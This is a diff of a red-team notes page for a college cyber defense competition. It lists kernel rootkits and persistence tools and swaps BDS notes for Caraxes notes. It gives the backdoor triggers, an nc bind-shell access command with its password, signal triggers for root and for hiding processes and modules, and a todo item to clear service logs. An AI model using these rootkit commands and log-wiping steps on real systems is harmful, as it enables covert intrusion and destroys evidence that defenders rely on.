@@ -82,15 +82,10 @@ pagetitle: Red Teaming for CCDC
 - [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
-  - Replace prism with Waterfall
-    - By god it's beautiful
-  - Get something going for alpine/RHEL/Nixos
-    - Put it all in one big script
-      - See how much we can pre-compile?
-    - RHEL
-      - Figure out service error message
-      - Figure out whether we want to dnf install in installation script
-        - Also need to add -y if so
+  - Look for log sources and make sure they're cleared
+    - Service logs, dmesg
+  - Add ssh key thing
+  - Get something going for alpine/Nixos
     - Alpine
       - Add a second location for SSH keys 
     - Nixos
@@ -104,15 +99,15 @@ pagetitle: Red Teaming for CCDC
         - Can use `ssh_across_ips.py`
           - `ssh_across_ips.py 10.100.100-120.35 {username} {password} '{command}'`
         - `for i in {1..10}; do echo $i; done`
-- [BDS](https://github.com/bluedragonsecurity/bds_lkm_ftrace)
-  - Good compatibility, works on 6.x tested
-    - Removed `rc.local` persistence - non-sneaky, and borks systems with checks for kernel tainting in startup
-    - Needed to add `dnf install -y kernel-devel-$(uname -r)` for RHEL-based systems
-  - Supports hiding files, backdoors, privescs, and hiding network connections (though only its connection, but we can easily change that)
-    - Root with `kill 000`
-    - Open bind shell with `nc {target_IP} 1338` and then access with `nc {target_IP} 31337` with password `bluedragonsec`
-  - Config
-    - Can be specified in `kernelspace/includes/bds_vars.h`
+- [Caraxes](https://github.com/ait-aecid/caraxes/tree/main)
+  - Good compatibility across distros as well
+    - Debian: `apt install -y gcc make linux-headers-$(uname -r)`
+    - RHEL: `yum install -y gcc make kernel-devel-$(uname -r)`
+  - Supports hiding files, backdoors, privescs
+    - Root with `kill -47 0`
+    - Hide process with `kill -48 {proc_id}`
+    - Hide module with `kill -49 0`
+    - Can be specified in `rootkit.h`
 - [Reptile](https://web.archive.org/web/20250703011339/https://github.com/f0rb1dd3n/Reptile/archive/refs/heads/master.zip)
   - Absolutely nutty rootkit for 2.6.x, 3.x, or 4.x, seems to be the go-to
     - Has persistent, detection evasion, a nice management interface
